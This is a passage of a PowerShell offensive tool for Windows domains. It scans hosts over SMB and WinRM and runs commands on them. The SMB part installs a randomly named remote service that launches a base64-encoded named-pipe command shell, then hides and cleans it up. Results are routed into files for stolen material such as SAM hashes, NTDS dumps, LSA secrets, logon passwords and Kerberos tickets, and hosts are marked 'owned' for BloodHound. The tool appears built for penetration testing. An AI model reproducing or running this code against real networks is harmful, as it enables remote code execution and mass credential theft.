                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "ERROR" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -eq "Timed Out") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "TIMED OUT" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -eq "NotDomainController" -and ($Module -eq "NTDS" -or $Module -eq "lsa-trust")) {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NON-DOMAIN CONTROLLER" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -like "*ActualConfig: Invalid namespace*" -and $Module -eq "SCCM") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NOT SCCM CLIENT" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -eq "No Results" -and $Module -eq "WinSCP") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "No Results" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }

                    elseif ($result -eq "RunAsPPL Disabled") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "RunAsPPL Disabled" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }

                    elseif ($result -eq "RunAsPPL Enabled") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "RunAsPPL Disabled" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }

                    elseif ($result -eq "Successful Connection PME") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -ComputerOwned
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -UserName $Username `
                            -AdminToProperty
                        Continue
                    }
                    elseif ($result -match "[a-zA-Z0-9]") {
                        if ($result -eq "No Results") {
                            if ($successOnly) { continue }
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                                -OS $($runspace.OS) `
                                -statusColor "Yellow" `
                                -statusSymbol "[*] " `
                                -statusText "NO RESULTS" `
                                -NameLength $NameLength `
                                -OSLength $OSLength
                            Continue
                        }
                        else {
                            $Global:SuccessCount++
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                                -OS $($runspace.OS) `
                                -statusColor "Green" `
                                -statusSymbol "[+] " `
                                -statusText "SUCCESS" `
                                -NameLength $NameLength `
                                -OSLength $OSLength
                            Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                                -Domain $Domain `
                                -ComputerOwned
                            Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                                -Domain $Domain `
                                -UserName $Username `
                                -AdminToProperty

                            $filePath = switch ($Module) {
                                "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                                "DPAPI" { "$DPAPI\$($runspace.ComputerName)-DPAPI.txt" }
                                "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                                "FileZilla" { "$FileZilla\$($runspace.ComputerName)-FileZilla.txt" }
                                "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                                "KerbDump" { "$Tickets\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                                "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                                "LSA" { "$LSADump\$($runspace.ComputerName)-LSA.txt" }
                                "LSA-Trust" { "$LSATrust\$($runspace.ComputerName)-Trust.txt" }
                                "MDF" { "$MDF\$($runspace.ComputerName)-MDF.txt" }
                                "NTDS" { "$DCSyncFullDump\$($runspace.ComputerName)-NTDS.txt" }
                                "NTLM" { "$NTLM\$($runspace.ComputerName)-NTLM.txt" }
                                "Notepad" { "$Notepad\$($runspace.ComputerName)-Notepad.txt" }
                                "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                                "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
                                "SessionExec" { "$SessionExec\$($runspace.ComputerName)-SessionExec.txt" }
                                "SessionRelay" { "$SessionRelay\$($runspace.ComputerName)-SessionRelay.txt" }
                                "SSH" { "$SSH\$($runspace.ComputerName)-SSH.txt" }
                                "TGTDeleg" { "$TGTDeleg\$($runspace.ComputerName)-TGTDeleg.txt" }
                                "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                                "VNC" { "$VNCDump\$($runspace.ComputerName)-VNC.txt" }
                                "Wifi" { "$Wifi\$($runspace.ComputerName)-Wifi.txt" }
                                "WinSCP" { "$WinSCP\$($runspace.ComputerName)-WinSCP.txt" }
                                default { $null }
                            }

                            if ($filePath) {
                                $result | Out-File -FilePath $filePath -Encoding "ASCII"

                                if ($ShowOutput) {
                                    $result | Write-Output
                                    Write-Output ""
                                    $hasDisplayedResult = $true
                                }
                            }

                            # Handle the default case.
                            if (-not $Module -and -not $hasDisplayedResult) {
                                $result | Write-Output
                                Write-Output ""
                                $hasDisplayedResult = $true
                            }
                        }
                    }
                    elseif ($result -notmatch "[a-zA-Z0-9]") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS " `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -ComputerOwned
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -UserName $Username `
                            -AdminToProperty
                        Continue
                    }

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })


        $runspacePool.Close()
        $runspacePool.Dispose()
    }

    ################################################################################################################
    ############################################## Function: SMB ################################################
    ################################################################################################################
    Function Method-SMB {

        Write-host

        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param($ComputerName, $Command, $Timeout)
    
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            $tcpClient.Close()
            if (!$connected) { return "Unable to connect" }   
    
            $SMBCheck = $false
            $SMBCheck = Test-Path "\\$ComputerName\c$" -ErrorAction "SilentlyContinue"

            if (!$SMBCheck) {
                return "Access Denied"
            }

            if ([string]::IsNullOrWhiteSpace($Command)) {
                return "Successful connection PME"
            }

    
            function Invoke-SMBRemoting {
	
                param (
                    [string]$PipeName,
                    [string]$ComputerName,
                    [string]$ServiceName,
                    [string]$Command,
                    [string]$Timeout = "80000",
                    [switch]$Verbose
                )
	
                $ErrorActionPreference = "SilentlyContinue"
                $WarningPreference = "SilentlyContinue"
                Set-Variable MaximumHistoryCount 32767

                $ComputerName = $ComputerName + "\"
	
                if (-not $ComputerName) {
                    Write-Output " [-] Please specify a Target"
                    return
                }
	
                if (!$PipeName) {
                    $randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % { [char]$_ })
                    $randomvalue = $randomvalue -join ""
                    $PipeName = $randomvalue
                }
	
                if (!$ServiceName) {
                    $randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % { [char]$_ })
                    $randomvalue = $randomvalue -join ""
                    $ServiceName = "Service_" + $randomvalue
                }
	
                $ServerScript = @"
`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 4096, 4096, `$null)
`$tcb={param(`$state);`$state.Close()};
`$tm = New-Object System.Threading.Timer(`$tcb, `$pipeServer, 600000, [System.Threading.Timeout]::Infinite);
`$pipeServer.WaitForConnection()
`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);
`$tm.Dispose();
`$sr = New-Object System.IO.StreamReader(`$pipeServer)
`$sw = New-Object System.IO.StreamWriter(`$pipeServer)
while (`$true) {
	if (-not `$pipeServer.IsConnected) {
		break
	}
	`$command = `$sr.ReadLine()
	if (`$command -eq "exit") {break} 
	else {
		try{
			`$result = Invoke-Expression `$command | Out-String
			`$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
		} catch {
			`$errorMessage = `$_.Exception.Message
			`$sw.WriteLine(`$errorMessage)
		}
		`$sw.WriteLine("###END###")
		`$sw.Flush()
	}
}
`$pipeServer.Disconnect()
`$pipeServer.Dispose()
"@
	
                $B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
	
                $arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
	
                $startarguments = "\\$ComputerName start $ServiceName"
	
                Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
	
                Start-Sleep -Milliseconds 1000
	
                Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
	
                if ($Verbose) {
                    Write-Output ""
                    Write-Output " [+] Pipe Name: $PipeName"
                    Write-Output ""
                    Write-Output " [+] Service Name: $ServiceName"
                    Write-Output ""
                    Write-Output " [+] Creating Service on Remote Target..."
                }
                #Write-Output ""
	
                # Get the current process ID
                $currentPID = $PID
	
                # Embedded monitoring script
                $monitoringScript = @"
`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
`$TargetServer = "$ComputerName"
`$primaryScriptProcessId = $currentPID

while (`$true) {
	Start-Sleep -Seconds 5 # Check every 5 seconds

	# Check if the primary script is still running using its Process ID
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }

	if (-not `$process) {
		# If the process is not running, delete the service
		`$stoparguments = "\\`$TargetServer delete `$serviceToDelete"
		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
		break
	}
}
"@
	
                $b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
	
                # Execute the embedded monitoring script in a hidden window
                $MonitoringProcess = Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden -PassThru
	
                $pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$ComputerName", $PipeName, 'InOut')
	
                try {
                    $pipeClient.Connect($Timeout)
                }
                catch [System.TimeoutException] {
                    return "Timed Out"

                }
                catch {
                    Write-Output "unexpected error"
                    Write-Output ""
                    return
                }

                $sr = New-Object System.IO.StreamReader($pipeClient)
                $sw = New-Object System.IO.StreamWriter($pipeClient)

                $serverOutput = ""
	
        
                $Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
                $fullCommand = "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(""$Command"")) | Out-String | IEX"
                $sw.WriteLine($fullCommand)
                $sw.Flush()
                while ($true) {
                    $line = $sr.ReadLine()
                    if ($line -eq "###END###") {
                        Write-Output $serverOutput.Trim()
                        Write-Output ""
                        break
                    }
                    else {
                        $serverOutput += "$line`n"
                    }
                } 
	
	

                $stoparguments = "\\$ComputerName delete $ServiceName"
                Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
                $pipeClient.Close()
                $pipeClient.Dispose()
                Stop-process -Id $MonitoringProcess.Id -ErrorAction "SilentlyContinue" -Force
            }
            return Invoke-SMBRemoting -ComputerName $ComputerName -Command $Command
        }

        # Create and invoke runspaces for each computer
        foreach ($computer in [array]$Computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }

            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        
        [int]$Global:SuccessCount = 0

        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {

                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                    $hasDisplayedResult = $false
                    try {
                        $result = $result.Trim()
                    }
                    catch {}

                    # [other conditions for $result]
                    if ($result -eq "Access Denied") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "ACCESS DENIED" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    elseif ($result -eq "Unexpected Error") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "ERROR" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    elseif ($result -eq "Timed Out") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "TIMED OUT" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    elseif ($result -eq "NotDomainController" -and ($Module -eq "NTDS" -or $Module -eq "lsa-trust")) {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NON-DOMAIN CONTROLLER" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    elseif ($result -like "*Object reference not set to an instance of an object.*" -and $Module -eq "SCCM") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NOT SCCM CLIENT" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    elseif ($result -eq "No Results" -and $Module -eq "WinSCP") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NO RESULTS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }

                    elseif ($result -eq "RunAsPPL Disabled") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "RunAsPPL Disabled" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }

                    elseif ($result -eq "RunAsPPL Enabled") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "RunAsPPL Disabled" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }

                    elseif ($result -eq "Successful Connection PME") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -ComputerOwned
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -UserName $Username `
                            -AdminToProperty
                        continue
                    }
                    
                    elseif ($result -eq "Unable to connect") {}

                    elseif ($result -match "[a-zA-Z0-9]") {
                        if ($result -eq "No Results") {
                            if ($successOnly) { continue }
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                                -OS $($runspace.OS) `
                                -statusColor "Yellow" `
                                -statusSymbol "[*] " `
                                -statusText "NO RESULTS" `
                                -NameLength $NameLength `
                                -OSLength $OSLength
                            continue
                        }
                        else {
                            $Global:SuccessCount++
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                                -OS $($runspace.OS) `
                                -statusColor "Green" `
                                -statusSymbol "[+] " `
                                -statusText "SUCCESS" `
                                -NameLength $NameLength `
                                -OSLength $OSLength
                            Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                                -Domain $Domain `
                                -ComputerOwned
                            Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                                -Domain $Domain `
                                -UserName $Username `
                                -AdminToProperty

                            $filePath = switch ($Module) {
                                "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                                "DPAPI" { "$DPAPI\$($runspace.ComputerName)-DPAPI.txt" }
                                "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                                "FileZilla" { "$FileZilla\$($runspace.ComputerName)-FileZilla.txt" }
                                "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                                "KerbDump" { "$Tickets\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                                "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                                "LSA" { "$LSADump\$($runspace.ComputerName)-LSA.txt" }
                                "LSA-Trust" { "$LSATrust\$($runspace.ComputerName)-Trust.txt" }
                                "MDF" { "$MDF\$($runspace.ComputerName)-MDF.txt" }
                                "NTDS" { "$DCSyncFullDump\$($runspace.ComputerName)-NTDS.txt" }
                                "NTLM" { "$NTLM\$($runspace.ComputerName)-NTLM.txt" }
                                "Notepad" { "$Notepad\$($runspace.ComputerName)-Notepad.txt" }
                                "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                                "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
                                "SessionExec" { "$SessionExec\$($runspace.ComputerName)-SessionExec.txt" }
                                "SessionRelay" { "$SessionRelay\$($runspace.ComputerName)-SessionRelay.txt" }
                                "SSH" { "$SSH\$($runspace.ComputerName)-SSH.txt" }
                                "TGTDeleg" { "$TGTDeleg\$($runspace.ComputerName)-TGTDeleg.txt" }
                                "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                                "VNC" { "$VNCDump\$($runspace.ComputerName)-VNC.txt" }
                                "Wifi" { "$Wifi\$($runspace.ComputerName)-Wifi.txt" }
                                "WinSCP" { "$WinSCP\$($runspace.ComputerName)-WinSCP.txt" }
                                default { $null }
                            }

                            if ($filePath) {
                                $result | Out-File -FilePath $filePath -Encoding "ASCII"

                                if ($ShowOutput) {
                                    $result | Write-Output
                                    Write-Output ""
                                    $hasDisplayedResult = $true
                                }
                            }

                            # Handle the default case.
                            if (-not $Module -and -not $hasDisplayedResult) {
                                $result | Write-Output
                                Write-Output ""
                                $hasDisplayedResult = $true
                            }
                        }
                    }
                    elseif ($result -notmatch "[a-zA-Z0-9]") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -ComputerOwned
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -UserName $Username `
                            -AdminToProperty
                        continue
                    }

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })


        $runspacePool.Close()
        $runspacePool.Dispose()

    }

    ################################################################################################################
    ############################################### Function: WinRM ################################################
    ################################################################################################################
    Function Method-WinRM {
        Write-host

        # Create a runspace pool
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($computerName, $Command, $Timeout, $Module, $IPAddress)
    
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, 5985, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            $tcpClient.Close()
            if (!$connected) { return "Unable to connect" }

            if ($IPAddress) {
                # Define the function before using it
                function Resolve-IPToDNSName {
                    param (
                        [string]$IPAddress
                    )
                    try {
                        $hostEntry = [System.Net.Dns]::GetHostEntry($IPAddress)
                        return $hostEntry.HostName
                    }
                    catch {
                        return "Unable to resolve"
                    }
                }

                # Use the function to resolve DNS Name
                $ComputerName = Resolve-IPToDNSName -IPAddress $ComputerName
                if ($ComputerName -eq "Unable to resolve") { return "Unable to resolve" }

            }
      
            try {
                # Leave these comments here because its a clusterfuck
                # Check if the module is "Amnesiac"
                if ($Module -eq "Amnesiac") {
                    # Test the connection by invoking a simple echo command
                    $result = Invoke-Command -ComputerName $computerName -ScriptBlock {
                        Write-Output "Successful Connection PME"
                    } -ErrorAction Stop

                    # If the test command succeeded, proceed with the actual command
                    if ($result) {
                        # Define a script block that will execute the command
                        $AscriptBlock = {
                            param($command)
                            Invoke-Expression $command
                        }

                        # Execute the command as a background job and ignore the job object
                        Invoke-Command -ComputerName $computerName -ScriptBlock $AscriptBlock -ArgumentList $Command -AsJob | Out-Null
                        # Return a success message
                        return "Successful Connection PME"
                    }
                    else {
                        # If the test command failed, return an access denied message
                        return "Access Denied"
                    }
                }
                elseif ($Command -eq "") {
                    # If the command is empty, execute a simple echo command
                    $result = Invoke-Command -ComputerName $computerName -ScriptBlock {
                        Write-Output "Successful Connection PME"
                    } -ErrorAction Stop

                    # If the result is empty, ensure a success message is returned
                    if (-not $result) {
                        $result = "Successful Connection PME"
                    }

                    # Return the result
                    return $result
                }
                elseif ($Command -ne "") {
                    # If a command is provided, execute it
                    $result = Invoke-Command -ComputerName $computerName -ScriptBlock {
                        Invoke-Expression $Using:Command
                    } -ErrorAction Stop

                    # If the result is empty, ensure a success message is returned
                    if (-not $result) {
                        $result = "Successful Connection PME"
                    }

                    # Return the result
                    return $result
                }
            }
            catch {
                # Handle exceptions based on their message
                if ($_.Exception.Message -like "*Access is Denied*") {
                    return "Access Denied"
                }
                elseif ($_.Exception.Message -like "*cannot be resolved*") {
                    return "Unable to connect"
                }

                elseif ($_.Exception.Message -like "*cannot find the computer*") {
                    return "cannot find the computer"
                }

                elseif ($_.Exception.Message -like "*Object reference not set to an instance of an object.*") {
                    return "Object reference not set to an instance of an object."
                }

                else {
                    return "Unspecified Error"
                }
            }

        }

        # Create and invoke runspaces for each computer
        foreach ($computer in [array]$Computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }
    
            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout).AddArgument($Module).AddArgument($IPAddress)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        [int]$Global:SuccessCount = 0

        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {

                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                    $hasDisplayedResult = $false

                    # [other conditions for $result]
                    if ($result -eq "Access Denied") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "ACCESS DENIED" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -eq "Unspecified Error") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "ERROR" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -eq "Unable to resolve") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "Unable to resolve DNS name, required for WinRM" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -like "*Cannot find the computer*") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "Unable to fully resolve the FQDN" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -eq "Timed Out") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "TIMED OUT" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -eq "NotDomainController" -and ($Module -eq "NTDS" -or $Module -eq "lsa-trust")) {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NON-DOMAIN CONTROLLER" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -like "*Object reference not set to an instance of an object.*" -and $Module -eq "SCCM") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NOT SCCM CLIENT" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -eq "No Results" -and $Module -eq "WinSCP") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NO RESULTS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }

                    elseif ($result -eq "RunAsPPL Disabled") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "RunAsPPL Disabled" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }

                    elseif ($result -eq "RunAsPPL Enabled") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "RunAsPPL Disabled" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }

                    elseif ($result -eq "Successful Connection PME") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
